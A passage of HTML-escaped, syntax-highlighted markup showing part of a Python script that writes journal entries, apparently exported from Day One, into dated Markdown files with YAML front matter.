style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDaySuffix &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDateTime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;strftime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;%Y&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tjournalAmericanDate &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDateTime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;strftime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;%-m/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;%-d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/%Y&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tjournalFileName &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDate &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDayName &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.md&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\twith&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; open&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalFileName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; as&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;---&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;title: Journal for &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDayName &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalHumanDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;date: &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;tags:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;  - Journal&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;aliases:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;  - Journal for &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDayName &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalHumanDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;  - &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDayName &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalHumanDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;  - &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalHumanDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;  - &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;  - &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalAmericanDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;locations:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;---&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tfor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalEntries&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;items&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;():&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;header&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;],&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\t\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[dayOneId:: &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;uuid&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;]&lt;/span&gt;&lt;span 